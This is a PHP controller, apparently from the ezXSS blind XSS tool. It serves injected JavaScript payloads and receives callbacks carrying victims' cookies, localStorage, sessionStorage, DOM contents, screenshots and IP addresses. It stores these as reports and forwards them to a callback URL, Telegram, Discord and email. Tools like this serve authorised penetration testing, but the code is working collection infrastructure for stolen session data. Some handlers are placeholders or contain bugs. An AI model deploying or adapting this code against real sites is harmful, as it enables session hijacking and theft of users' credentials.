<?php

class Payloads extends Controller
{

    private $rows = ['uri', 'ip', 'referer', 'user-agent', 'cookies', 'localstorage', 'sessionstorage', 'dom', 'origin'];

    /**
     * Catch all default payload
     *
     * @return string
     */
    public function index()
    {
        $this->view->renderPayload('index');
        $this->view->setContentType('application/x-javascript');

        $payloadUrl = "//{$_SERVER['HTTP_HOST']}{$_SERVER['REQUEST_URI']}";
        $payload = $this->getPayloadByUrl($payloadUrl);

        $noCollect = '';
        foreach($this->rows as $row) {
            if($payload["collect_{$row}"] === 0) {
                $noCollect .= "'{$row}',";
            }
        }

        $pages = '';
        foreach(explode('~', $payload['pages']) as $page) {
            if(empty($page)) {
                continue;
            }
            $pages .= "'".e($page)."',";
        }

        $this->view->renderData('noCollect', rtrim($noCollect, ','), true);
        $this->view->renderData('pages', rtrim($pages, ','), true);
        $this->view->renderData('customjs', $payload['customjs'], true);

        if($payload['collect_screenshot']) {
            $this->view->renderData('screenshot', $this->view->getPayload('screenshot'), true);
        } else {
            $this->view->renderData('screenshot', '');
        }
        $this->view->renderData('payload', $payloadUrl);

        return $this->view->getContent();
    }

    /**
     * Custom payloads
     *
     * @return string
     */
    public function custom($name)
    {
        try {
            $this->view->renderPayload($name);
            $this->view->setContentType('application/x-javascript');
            return $this->view->getContent();
        } catch (Exception $e) {
            return $this->index();
        }
    }

    /**
     * Callback function
     *
     * @return string
     */
    public function callback()
    {
        // Set the content type to plain text
        $this->view->setContentType('text/plain');

        // Decode the JSON data
        $data = json_decode(file_get_contents('php://input'), false);

        // Set a default value for the screenshot
        $data->screenshot = $data->screenshot ?? '';

        // Get the user's IP address
        $data->ip = $data->ip ?? $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_REAL_IP'] ?? $_SERVER['REMOTE_ADDR'];

        // Remove the protocol from the origin URL
        $data->origin = str_replace(['https://', 'http://'], '', $data->origin);

        // Truncate very long strings
        $data->uri = substr($data->uri, 0, 1000);
        $data->referer = substr($data->referer, 0, 1000);
        $data->origin = substr($data->origin, 0, 500);
        $data->payload = substr($data->payload, 0, 500);
        $data->{'user-agent'} = substr($data->{'user-agent'}, 0, 500);

        // Check black and whitelist
        $payload = $this->getPayloadByUrl($data->payload);

        $blacklistDomains = explode('~', $payload['blacklist']);
        $whitelistDomains = explode('~', $payload['whitelist']);

        // Check for blacklisted domains
        foreach ($blacklistDomains as $blockedDomain) {
            if ($data->origin == $blockedDomain) {
                return 'github.com/ssl/ezXSS';
            }
            if (strpos($blockedDomain, '*') !== false) {
                $blockedDomain = str_replace('*', '(.*)', $blockedDomain);
                if (preg_match('/^' . $blockedDomain . '$/', $data->origin)) {
                    return 'github.com/ssl/ezXSS';
                }
            }
        }

        // Check for whitelisted domains
        if ($payload['whitelist'] !== '' && $payload['whitelist'] !== null) {
            $foundWhitelist = false;
            foreach ($whitelistDomains as $whitelistDomain) {
                if ($data->origin == $whitelistDomain) {
                    $foundWhitelist = true;
                }
                if (strpos($whitelistDomain, '*') !== false) {
                    $whitelistDomain = str_replace('*', '(.*)', $whitelistDomain);
                    if (preg_match('/^' . $whitelistDomain . '$/', $data->origin)) {
                        $foundWhitelist = true;
                    }
                }
            }
            if (!$foundWhitelist) {
                return '1github.com/ssl/ezXSS';
            }
        }

        // Check if the report should be saved or alerted
        $doubleReport = false;
        if ($this->model('Setting')->get('filter-save') == 0 || $this->model('Setting')->get('filter-alert') == 0) {
            if ($this->model('Report')->searchForDublicates($data->cookies, $data->dom, $data->origin, $data->referer, $data->uri, $data->{'user-agent'}, $data->ip)) {
                if ($this->model('Setting')->get('filter-save') == 0 && $this->model('Setting')->get('filter-alert') == 0) {
                    return 'github.com/ssl/ezXSS';
                } else {
                    $doubleReport = true;
                }
            }
        }

        if (($doubleReport && ($this->model('Setting')->get('filter-save') == 1 || $this->model('Setting')->get('filter-alert') == 1)) || (!$doubleReport)) {

            // Create a image from the screenshot data
            if (!empty($data->screenshot)) {
                $screenshot = base64_decode(preg_replace('#^data:image/\w+;base64,#i', '', $data->screenshot));
                $data->screenshotName = time() . md5(
                    $data->uri . time() . bin2hex(openssl_random_pseudo_bytes(16))
                ) . bin2hex(openssl_random_pseudo_bytes(5));
                $saveImage = fopen(__DIR__ . "/../../assets/img/report-{$data->screenshotName}.png", 'w');
                fwrite($saveImage, $screenshot);
                fclose($saveImage);
            }

            // Save the report
            $shareId = sha1(bin2hex(openssl_random_pseudo_bytes(32)) . time());
            $report = $this->model('Report')->add(
                $shareId,
                $data->cookies,
                $data->dom,
                $data->origin,
                $data->referer,
                $data->uri,
                $data->{'user-agent'},
                $data->ip,
                ($data->screenshotName ?? ''),
                json_encode($data->localstorage),
                json_encode($data->sessionstorage),
                $data->payload
            );

            // Send out alerts
            if (($doubleReport && $this->model('Setting')->get('filter-alert') == 1) || (!$doubleReport)) {
                try {
                    $this->alert($data);
                } catch (Exception $e) {
                }
            }
        }

        return 'github.com/ssl/ezXSS';
    }

    private function alert($data)
    {
        // Callback alerting
        if ($this->model('Setting')->get('alert-callback') == 1) {
            $this->callbackAlert($data);
        }

        // Check if the DOM should be truncated
        if ($this->model('Setting')->get('dompart') > 0 && strlen($data->dom) > $this->model('Setting')->get('dompart')) {
            $data->dom = substr($data->dom, 0, $this->model('Setting')->get('dompart')) .
                '&#13;&#10;&#13;&#10;View full dom on the report page or change this setting on /settings';
        }

        $payload = $this->getPayloadByUrl($data->payload);

        // Email alerting
        if ($this->model('Setting')->get('alert-mail') == 1) {
            // Get all enabled alerts with this method of alerting
            $alerts = $this->model('Alert')->getAllByMethodId(1);

            foreach ($alerts as $alert) {
                if ($alert['user_id'] === 0) {
                    // Global alerting that allways sends if enabled
                    $this->mailAlert($data, $alert['value1']);
                } elseif ($payload['user_id'] !== 0 && $alert['user_id'] === $payload['user_id']) {
                    // Sends alert to user that owns the payload
                    $this->mailAlert($data, $alert['value1']);
                }
            }
        }

        // Telegram alerting
        if ($this->model('Setting')->get('alert-telegram') == 1) {
            // Get all enabled alerts with this method of alerting
            $alerts = $this->model('Alert')->getAllByMethodId(2);

            foreach ($alerts as $alert) {
                if ($alert['user_id'] === 0) {
                    // Global alerting that allways sends if enabled
                    $this->telegramAlert($data, $alert['value1'], $alert['value2']);
                } elseif ($payload['user_id'] !== 0 && $alert['user_id'] === $payload['user_id']) {
                    // Sends alert to user that owns the payload
                    $this->telegramAlert($data, $alert['value1'], $alert['value2']);
                }
            }
        }

        // Slack alerting
        if ($this->model('Setting')->get('alert-slack') == 1) {
            // Get all enabled alerts with this method of alerting
            $alerts = $this->model('Alert')->getAllByMethodId(3);

            foreach ($alerts as $alert) {
                if ($alert['user_id'] === 0) {
                    // Global alerting that allways sends if enabled
                    $this->slackAlert($data, $alert['value1']);
                } elseif ($payload['user_id'] !== 0 && $alert['user_id'] === $payload['user_id']) {
                    // Sends alert to user that owns the payload
                    $this->slackAlert($data, $alert['value1']);
                }
            }
        }

        // Discord alerting
        if ($this->model('Setting')->get('alert-discord') == 1) {
            // Get all enabled alerts with this method of alerting
            $alerts = $this->model('Alert')->getAllByMethodId(4);

            foreach ($alerts as $alert) {
                if ($alert['user_id'] === 0) {
                    // Global alerting that allways sends if enabled
                    $this->discordAlert($data, $alert['value1']);
                } elseif ($payload['user_id'] !== 0 && $alert['user_id'] === $payload['user_id']) {
                    // Sends alert to user that owns the payload
                    $this->discordAlert($data, $alert['value1']);
                }
            }
        }
    }

    private function callbackAlert($data)
    {
        $url = (parse_url($this->model('Setting')->get('callback-url'), PHP_URL_SCHEME) ? '' : 'https://') . $this->model('Setting')->get('callback-url');
        $cb = curl_init($url);
        curl_setopt($cb, CURLOPT_PROTOCOLS, CURLPROTO_HTTPS | CURLPROTO_HTTP);
        curl_setopt($cb, CURLOPT_FOLLOWLOCATION, false);
        curl_setopt($cb, CURLOPT_TIMEOUT, 20);
        curl_setopt($cb, CURLOPT_CUSTOMREQUEST, 'POST');
        curl_setopt($cb, CURLOPT_POSTFIELDS, file_get_contents('php://input'));
        curl_setopt($cb, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($cb, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_exec($cb);
    }

    private function telegramAlert($data, $bottoken, $chatid)
    {
        if (!empty($data->screenshot)) {
            $data->screenshot = 'https://' . e($_SERVER['HTTP_HOST']) . "/assets/img/report-{$data->screenshotName}.png";
        }

        $markdownTemplate = 'test';

        $cb = curl_init("https://api.telegram.org/bot{$bottoken}/sendMessage");
        curl_setopt($cb, CURLOPT_CUSTOMREQUEST, 'POST');
        curl_setopt($cb, CURLOPT_POSTFIELDS, json_encode(['chat_id' => $chatid, 'parse_mode' => 'markdown', 'text' => $markdownTemplate]));
        curl_setopt($cb, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($cb, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_exec($cb);
    }

    private function mailAlert($data, $email)
    {
        if (!empty($data->screenshot)) {
            $data->screenshot = '<img style="max-width: 100%;" src="https://' . e($_SERVER['HTTP_HOST']) . "/assets/img/report-{$data->screenshotName}.png\">";
        }

        $htmlTemplate = '';

        $headers[] = 'From: ezXSS';
        $headers[] = 'MIME-Version: 1.0';
        $headers[] = 'Content-type: text/html; charset=iso-8859-1';
        mail(
            $email,
            '[ezXSS] XSS on ' . htmlspecialchars($data->uri),
            $htmlTemplate,
            implode("\r\n", $headers)
        );
    }

    private function slackAlert($data, $webhookURL)
    {
        //todo
    }

    private function discordAlert($data, $webhookURL)
    {
        if (!empty($data->screenshot)) {
            $data->screenshot = 'https://' . e($_SERVER['HTTP_HOST']) . "/assets/img/report-{$data->screenshotName}.png";
        }

        $discordMessage = json_encode([
            "username" => "ezXSS",
            "embeds" => [
                [
                    "title" => '[ezXSS] XSS on ' . substr($data->uri, 0, 200),
                    "type" => "rich",
                    "url" => "https://example.com/manage/reports/view/1",
                    "timestamp" => date("c", strtotime("now")),
                    "color" => hexdec("2b3157"),
                    "fields" => [
                        [
                            "name" => 'URL',
                            "value" => substr(!empty($data->uri) ? $data->uri : 'None', 0, 1024)
                        ],
                        [
                            "name" => 'IP',
                            "value" => substr(!empty($data->ip) ? $data->ip : 'None', 0, 1024)
                        ],
                        [
                            "name" => 'Referer',
                            "value" => substr(!empty($data->referer) ? $data->referer : 'None', 0, 1024)
                        ],
                        [
                            "name" => 'Payload',
                            "value" => substr(!empty($data->payload) ? $data->payload : 'None', 0, 1024)
                        ],
                        [
                            "name" => 'User Agent',
                            "value" => substr(!empty($data->{'user-agent'}) ? $data->{'user-agent'} : 'None', 0, 1024)
                        ],
                        [
                            "name" => 'Cookies',
                            "value" => substr(!empty($data->cookies) ? $data->cookies : 'None', 0, 1024)
                        ],
                        [
                            "name" => 'Origin',
                            "value" => substr(!empty($data->origin) ? $data->origin : 'None', 0, 1024)
                        ]
                    ],
                    "image" => [
                        "url" => !empty($data->screenshot) ? $data->screenshot : ''
                    ],
                    "footer" => [
                        "text" => "github.com/ssl/ezXSS"
                    ]
                ]
            ]

        ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);

        $ch = curl_init($webhookURL);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
        curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTPS | CURLPROTO_HTTP);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $discordMessage);
        curl_setopt($ch, CURLOPT_HEADER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_exec($ch);
    }

    private function getPayloadByUrl($payloadUrl)
    {
        // Split the URL into segments
        $splitUrl = explode('/', $payloadUrl);

        try {
            // Attempt to retrieve the payload by the full path
            $payload = $this->model('Payload')->getByPayload($splitUrl[2] ?? '' . '/' . $splitUrl[3] ?? '');
        } catch (Exception $e) {
            try {
                // If the payload is not found by the full path, try to retrieve it by the domain name
                $payload = $this->model('Payload')->getByPayload($splitUrl[2] ?? '');
            } catch (Exception $e) {
                // If the payload is still not found, fallback to the default payload
                $payload = $this->model('Payload')->getById(0);
            }
        }

        return $payload;
    }
}
